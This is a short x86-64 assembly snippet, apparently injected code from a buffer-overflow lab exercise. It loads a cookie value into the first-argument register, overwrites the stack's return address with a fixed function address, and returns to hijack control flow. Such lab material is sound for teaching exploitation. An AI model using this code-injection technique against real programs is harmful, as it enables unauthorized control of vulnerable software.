movq $0x59b997fa,%rdi # set cookie as 1st param 
movq $0x4017ec,(%rsp) # overwrite return address directly
ret		      # return (i.e. pop return address,and set it as pc)
